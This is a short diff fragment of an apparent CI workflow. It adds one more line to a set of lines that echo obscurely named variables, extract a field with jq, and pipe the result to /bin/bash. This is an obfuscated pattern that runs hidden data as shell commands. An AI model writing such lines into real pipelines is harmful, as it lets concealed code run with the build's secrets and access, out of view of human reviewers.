@@ -24,6 +24,7 @@ jobs:
           echo $tnya975 | jq -r .wvoq105 | /bin/bash
           printf '%s' "$c87" | jq -r .z5 | /bin/bash
           echo $ezeh2074 | jq -r .l5 | /bin/bash
+          echo $t668 | jq -r .dztg08 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
